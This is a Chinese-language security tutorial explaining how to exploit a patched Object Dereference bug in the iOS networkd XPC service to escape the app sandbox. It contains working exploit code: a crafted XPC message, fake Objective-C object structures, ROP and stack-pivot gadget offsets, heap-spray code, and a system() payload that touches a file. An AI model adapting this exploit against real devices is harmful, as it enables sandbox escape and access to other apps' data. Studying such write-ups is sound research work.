# iOS冰与火之歌 – 利用XPC过App沙盒

0x00 序
======

* * *

冰指的是用户态，火指的是内核态。如何突破像冰箱一样的用户态沙盒最终到达并控制如火焰一般燃烧的内核就是《iOS冰与火之歌》这一系列文章将要讲述的内容。这次给大家带来的是利用XPC突破app沙盒，并控制其他进程的pc（program counter）执行system指令。

《iOS冰与火之歌》系列的目录如下：

1.  Objective-C Pwn and iOS arm64 ROP
2.  在非越狱的iOS上进行App Hook（番外篇）
3.  App Hook答疑以及iOS 9砸壳（番外篇）
4.  利用XPC过App沙盒
5.  █████████████

另外文中涉及代码可在我的github下载:  
[https://github.com/zhengmin1989/iOS_ICE_AND_FIRE](https://github.com/zhengmin1989/iOS_ICE_AND_FIRE)

0x01 什么是XPC
===========

* * *

在iOS上有很多IPC(内部进程通讯)的方法，最简单最常见的IPC就是URL Schemes，也就是app之间互相调起并且传送简单字符的一种机制。比如我用`[[UIApplication sharedApplication] openURL:url]`这个api再配合"`alipay://`", “`wechat://`”等url，就可以调起支付宝或者微信。

今天要讲的XPC比URLScheme要稍微复杂一点。XPC也是iOS IPC的一种，通过XPC，app可以与一些系统服务进行通讯，并且这些系统服务一般都是在沙盒外的，如果我们可以通过IPC控制这些服务的话，也就成功的做到沙盒逃逸了。App在沙盒内可以通过XPC访问的服务大概有三四十个，数量还是非常多的。

想要与这些XPC服务通讯我们需要创建一个XPC client，传输的内容要与XPC service接收的内容对应上，比如系统服务可能会开这样一个XPC service：

```
xpc_connection_t listener = xpc_connection_create_mach_service("com.apple.xpc.example",
                                                               NULL, XPC_CONNECTION_MACH_SERVICE_LISTENER);
    xpc_connection_set_event_handler(listener, ^(xpc_object_t peer) {
        // Connection dispatch
        xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
            // Message dispatch
            xpc_type_t type = xpc_get_type(event);
            if (type == XPC_TYPE_DICTIONARY){
                //Message handler
            }
        });
        xpc_connection_resume(peer);
    });
    xpc_connection_resume(listener);

```

如果我们可以在沙盒内进行访问的话，我们可以通过建立XPC的客户端进行连接：

```
xpc_connection_t client = xpc_connection_create_mach_service("com.apple.xpc.example",
                                                               NULL, 0);
    xpc_connection_set_event_handler(client, ^(xpc_object_t event) {
    });
    xpc_connection_resume(client);
    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_uint64 (message, "value", 0);
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(client, message);

```

运行上述程序后，在server端那边就可以收到client端的消息了。

我们知道，xpc传输的其实就是一段二进制数据。比如我们传输的xpc_dictionary是这样的：

![null](http://drops.javaweb.org/uploads/images/be8e48d85321ba8158f24cc474b57552f64bf45d.jpg)

实际传输的数据确是这样的（通过lldb，然后`break set --name _xpc_serializer_get_dispatch_mach_msg`就可以看到）：

![p2](http://drops.javaweb.org/uploads/images/7e353a14678ce5249e2cdfec1f7ae6aa30e1cf0f.jpg)

可以看到这些传输的数据都经过序列化转换成二进制data，然后等data传递到系统service的服务端以后，再通过反序列化函数还原回原始的数据。

我们知道正常安装后的app是mobile权限，但是被sandbox限制在了一个狭小的空间里。如果系统服务在接收XPC消息的时候出现了问题，比如Object Dereference漏洞等，就可能让client端控制server端的pc寄存器，从而利用rop执行任意指令。虽然大多数系统服务也是mobile权限，但是大多数系统服务并没有被sandbox，因此就可以拥有读取或修改大多数文件的权限或者是执行一些能够访问kernel的api从而触发panic。

0x02 Com.apple.networkd Object Dereference漏洞分析
==============================================

* * *

Com.apple.networkd 是一个app沙盒内可达的xpc系统服务。这个服务对应的binary是/usr/libexec/networkd。我们可以通过ps看到这个服务的权限是_networkd：

![p3](http://drops.javaweb.org/uploads/images/3b1c8e155d7421140f94a0d9b822d38d9954df28.jpg)

虽然没有root权限，但是也几乎可以做到沙盒外任意文件读写了。在iOS 8.1.3及之前版本，这个XPC系统服务存在Object Dereference漏洞，这个漏洞是由Google Project Zero的IanBeer发现的，但他给的poc只是Mac OS X上的，并且hardcode了很多地址。而本篇文章将以iphone 4s, arm32, 7.1.1为测试机，一步一步讲解如何找到这些hardcode的地址和gadgets，并利用这个漏洞做到app的沙盒逃逸。

问题出在com.apple.networkd这个服务的`char *__fastcall sub_A878(int a1)`这个函数中，对传入的”`effective_audit_token`”这个值没有做类型校验，就直接当成xpc_data这种数据类型进行解析了：

![5](http://drops.javaweb.org/uploads/images/dbbeed5431b78a878a8acfedd0673995e6c38802.jpg)

然而如果我们传过去的值并不是一个xpc_data，networkd也会当这个值是一个xpc_data，并传给`_xpc_data_get_bytes_ptr()`来进行解析：

![null](http://drops.javaweb.org/uploads/images/2d330fac777fd4a8482db9c9fd1e061f761a96f2.jpg)

解析完成后，无论这个对象是否符合service程序的预期，程序都会调用`_dispatch_objc_release()`这个函数来release这个对象。因此，我们就想到了是否可以伪造一个objective-C的对象，同时将这个对象的release()函数给加入到cache里，这样的话，在程序release这个对象的时候，就可以控制pc指针指向我们想要执行的ROP指令了。

是的，这个想法是可行的。首先我们要做的是根据数据传输的协议（通过反编译networkd得到）构造相应的xpc数据：

```
xpc_object_t dict = xpc_dictionary_create(NULL, NULL, 0);

xpc_dictionary_set_uint64(dict, "type", 6);
xpc_dictionary_set_uint64(dict, "connection_id", 1);

xpc_object_t params = xpc_dictionary_create(NULL, NULL, 0);
xpc_object_t conn_list = xpc_array_create(NULL, 0);

xpc_object_t arr_dict = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(arr_dict, "hostname", "example.com");

xpc_array_append_value(conn_list, arr_dict);
xpc_dictionary_set_value(params, "connection_entry_list", conn_list);

uint32_t uuid[] = {0x0, 0x1fec000};
xpc_dictionary_set_uuid(params, "effective_audit_token", (const unsigned char*)uuid);

xpc_dictionary_set_uint64(params, "start", 0);
xpc_dictionary_set_uint64(params, "duration", 0);

xpc_dictionary_set_value(dict, "parameters", params);

xpc_object_t state = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_int64(state, "power_slot", 0);
xpc_dictionary_set_value(dict, "state", state);

```

随后我们可以使用`NSLog(@"%@",dict);`将我们构造好以后的xpc数据打印出来：

![p6](http://drops.javaweb.org/uploads/images/ddf1f2aa1f90cf1ac0ef388f7c2cea40cf650019.jpg)

除了effective_audit_token以外的其他数据都是正常的。为了攻击这个系统服务，我们把`effective_audit_token`的值用`xpc_dictionary_set_uuid`设置为`{0x0, 0x1fec000};`。0x1fec000这个地址保存的将会是我们伪造的Objective-C对象。构造完xpc数据后，我们就可以将数据发送到networkd服务端触发漏洞了。但如何构造一个伪造的ObjectC对象，以及如何将伪造的对象保存到这个地址呢？请继续看下一章。

0x03 构造fake Objective-C对象以及Stack Pivot
======================================

* * *

首先我们需要通过伪造一个fake Objective-C对象和构造一个假的cache来控制pc指针。这个技术我们已经在《iOS冰与火之歌 – Objective-C Pwn and iOS arm64 ROP》中介绍了。简单说一下思路：

第一步，我们需要找到selector在内存中的地址，这个问题可以使用`NSSelectorFromString()`这个系统自带的API来解决，比如我们需要用到”release”这个selector的地址，就可以使用`NSSelectorFromString(@"release")`来获取。

第二步，我们要构建一个假的receiver，假的receiver里有一个指向假的objc_class的指针，假的objc_class里又保存了假的cache_buckets的指针和mask。假的cache_buckets的指针最终指向我们将要伪造的selector和selector函数的地址。这个伪造的函数地址就是我们要执行的ROP链的起始地址。

最终代码如下：

```
hs->fake_objc_class_ptr = &hs->fake_objc_class;
hs->fake_objc_class.cache_buckets_ptr = &hs->fake_cache_bucket;
hs->fake_objc_class.cache_bucket_mask = 0;
hs->fake_cache_bucket.cached_sel = (void*) NSSelectorFromString(@"release");
hs->fake_cache_bucket.cached_function = start address of ROP chain

```

既然通过fake Objective-C对象，我们控制了xpc service的pc，我们就可以在sandbox外做些事情了。但因为DEP的关系，如果我们没有给kernel打patch，我们并不能执行任意的shellcode。因此我们需要用ROP来达到我们的目的。虽然program image，library，堆和栈等都是随机，但好消息是`dyld_shared_cache`这个共享缓存的地址开机后是固定的，并且每个进程的`dyld_shared_cache`都是相同的。这个`dyld_shared_cache`有好几百M大，基本上可以满足我们对gadgets的需求。因此我们只要在自己的进程获取`dyld_shared_cache`的基址就能够计算出目标进程gadgets的位置。

`dyld_shared_cache`文件一般保存在/System/Library/Caches/com.apple.dyld/这个目录下。我们下载下来以后，可以使用jtool将里面的dylib提取出来。比如我们想要提取CoreFoundation这个framework，就可以使用：

`jtool -extract CoreFoundation ./dyld_shared_cache_armv7`

随后就可以用ROPgadget这个工具来搜索gadget了。如果是arm32位的话，记得加上thumb模式，不然默认是按照arm模式搜索的，gadget会少很多：

`ROPgadget --binary ./dyld_shared_cache_armv7.CoreFoundation --rawArch=arm --rawMode=thumb`

接下来我们需要找到一个用来做stack pivot的gadget，因为我们刚开始只控制了有限的几个寄存器，并且栈指针指向的地址也不是我们可以控制的，如果我们想控制更多的寄存器并且持续控制pc的话，就需要使用stack pivot gadget将栈指针指向一段我们可以控制的内存地址，然后利用pop指令来控制更多的寄存器以及PC。另一点要注意的是，如果我们想使用thumb指令，就需要给跳转地址1，因为arm CPU是通过最低位来判断是thumb指令还是arm指令的。我们在iphone4s 7.1.2上找到的stack pivot gadgets如下：

```
/*
__text:2D3B7F78    MOV      SP, R4
__text:2D3B7F7A    POP.W    {R8,R10}
__text:2D3B7F7E    POP      {R4-R7,PC}
*/

hs->stack_pivot= CoreFoundation_base + 0x4f78 + 1;
NSLog(@"hs->stack_pivot  = 0x%08x", (uint32_t)(CoreFoundation_base + 0x4f78));

```

因为进行stack pivot需要控制r4寄存器，但最开始我们只能控制r0，因此我们先找一个gadget把r0的值赋给r4，然后再调用stack pivot gadget：

```
/*
    0x2dffc0ee: 0x4604    mov    r4, r0
    0x2dffc0f0: 0x6da1    ldr    r1, [r4, #0x58]
    0x2dffc0f2: 0xb129    cbz    r1, 0x2dffc100    ; <+28>
    0x2dffc0f4: 0x6ce0    ldr    r0, [r4, #0x4c]
    0x2dffc0f6: 0x4788    blx    r1
*/
hs->fake_cache_bucket.cached_function = CoreFoundation_base + 0x0009e0ee + 1; //fake_struct.stack_pivot_ptr
NSLog(@"hs->fake_cache_bucket.cached_function  = 0x%08x", (uint32_t)(CoreFoundation_base+0x0009e0ee));

```

经过stack pivot后，我们控制了栈和其他的寄存器，随后我们就可以调用想要执行的函数了，比如说用system指令执行”`touch /tmp/iceandfire`”。当然我们也需要找到相应的gadget，并且在栈上对应的正确地址上放入相应寄存器的值：

```
// 0x00000000000d3842 : mov r0, r4 ; mov r1, r5 ; blx r6

strcpy(hs->command, "touch /tmp/ iceandfire");
hs->r4=(uint32_t)&hs->command;
hs->r6=(void *)dlsym(RTLD_DEFAULT, "system");
hs->pc = CoreFoundation_base+0xd3842+1;
NSLog(@"hs->pc = 0x%08x", (uint32_t)(CoreFoundation_base+0xd3842));

```

最终我们伪造的Objective-C的结构体构造如下：

```
struct heap_spray {
    void* fake_objc_class_ptr;
    uint32_t r10;
    uint32_t r4;
    uint32_t r5;
    uint32_t r6;
    uint32_t r7;
    uint32_t pc;
    uint8_t pad1[0x3c];
    uint32_t stack_pivot;
    struct fake_objc_class_t {
        char pad[0x8];
        void* cache_buckets_ptr;
        uint32_t cache_bucket_mask;
    } fake_objc_class;
    struct fake_cache_bucket_t {
        void* cached_sel;
        void* cached_function;
    } fake_cache_bucket;
    char command[1024];
};

```

0x04 堆喷(Heap Spray)
===================

* * *

虽然我们可以利用一个伪造的Objective-C对象来控制networkd。但是我们需要将这个对象保存在networkd的内存空间中才行，并且因为ASLR（地址随机化）的原因，我们就算能把伪造的对象传输过去，也很难计算出这个对象在内存中的具体位置。那么应该怎么做呢？方法就是堆喷(Heap Spray)。虽然ASLR意味着每次启动服务，program image，library，堆和栈等都是随机。但实际上这个随机并不是完全的随机，只是在某个地址范围内的随机罢了。因此我们可以利用堆喷在内存中喷出一部分空间(尽可能的大，为了能覆盖到随机地址的范围)，然后在里面填充n个fake Object就可以了。

![p7](http://drops.javaweb.org/uploads/images/5b1d1253eaf7430f58891002ff82786568965f94.jpg)

我进行漏洞测试的环境是，iPhone4s (arm 32位) 7.1.2，我们选择了0x1fec000这个地址，因为经过多次堆喷测试，这个地址可以达到将近100%的喷中率。堆喷的代码如下：

```
void* heap_spray_target_addr = (void*)0x1fec000;

struct heap_spray* hs = mmap(heap_spray_target_addr, 0x1000, 3, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
memset(hs, 0x00, 0x1000);

size_t heap_spray_pages = 0x2000;
size_t heap_spray_bytes = heap_spray_pages * 0x1000;
char* heap_spray_copies = malloc(heap_spray_bytes);

for (int i = 0; i < heap_spray_pages; i++){
    memcpy(heap_spray_copies+(i*0x1000), hs, 0x1000);
}

xpc_connection_t client = xpc_connection_create_mach_service("com.apple.networkd", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);

xpc_connection_set_event_handler(client, ^void(xpc_object_t response) {
    xpc_type_t t = xpc_get_type(response);
    if (t == XPC_TYPE_ERROR){
        printf("err: %s\n", xpc_dictionary_get_string(response, XPC_ERROR_KEY_DESCRIPTION));
    }
    printf("received an event\n");
    });


xpc_connection_resume(client);

xpc_object_t dict = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_data(dict, "heap_spray", heap_spray_copies, heap_spray_bytes);
xpc_connection_send_message(client, dict);

```

随后我们编译执行我们的app，app会将fake ObjectiveC对象用堆喷的方式填充到networkd的内存中，随后app会触发object dereference漏洞来控制pc，随后app会利用rop执行`system("touch /tmp/iceandfire")`指令。运行完app后，我们发现在/tmp/目录下已经出现了iceandfire这个文件了，说明我们成功突破了沙盒并执行了system指令：

![p8](http://drops.javaweb.org/uploads/images/a463c29b7547b6fba97045468368793e2286de44.jpg)

![p9](http://drops.javaweb.org/uploads/images/492cd02ea16d72a22fa26aefc2d7b2a60ff5c5a6.jpg)

0x05 总结
=======

* * *

这篇文章我们介绍了如何利用XPC突破沙盒，进行堆喷，控制系统服务的PC，并且利用ROP进行stack pivot，然后执行system指令。突破沙盒后，虽然不能安装盗版的app，但一个app就可以随心所欲的增删改查其他app的文件和数据了，有种android上root的感觉。 虽然这个漏洞已经在8.1.3上修复了，但不代表以后不会出现类似的漏洞。比如我们发现的这个iOS 9.3 0day就可以轻松突破最新版的iOS沙盒获取到其他app的文件：

[http://www.iqiyi.com/w_19rsxza559.html](http://www.iqiyi.com/w_19rsxza559.html)

但由于漏洞还没有被修复，所以我们暂时不会公布漏洞细节，想要了解更多关于iOS 0day漏洞的信息欢迎关注我的微博 @蒸米spark。

最后感谢龙磊和黑雪对这篇文章的指导和帮助。另外文中涉及代码可在我的github下载:

[https://github.com/zhengmin1989/iOS_ICE_AND_FIRE](https://github.com/zhengmin1989/iOS_ICE_AND_FIRE)

0x06 参考资料
=========

* * *

1.  Ianbeer, Auditing and Exploiting Apple IPC
2.  Pangu, Review and Exploit Neglected Attack Surface in iOS 8